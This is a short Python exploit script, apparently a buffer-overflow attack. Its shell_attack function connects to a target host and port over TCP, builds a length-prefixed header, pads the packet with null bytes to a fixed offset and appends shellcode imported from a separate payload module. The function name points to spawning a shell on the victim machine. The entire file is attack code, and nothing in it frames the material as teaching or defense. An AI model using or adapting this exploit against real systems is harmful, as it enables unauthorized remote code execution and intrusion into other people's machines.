import socket
import sys
import time


from payload import buf

import struct
def shell_attack(target_machine, target_port):

    ip = target_machine
    port = target_port


    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))

    offset = 143
    header = str(len(str(offset))) + str(offset) + '1'

    packet = header
    packet += "\x00" * (140 - len(packet))
    packet += buf# exit() may require a different offset in your build

    s.sendall(packet)
    data = s.recv(1024)
    s.close()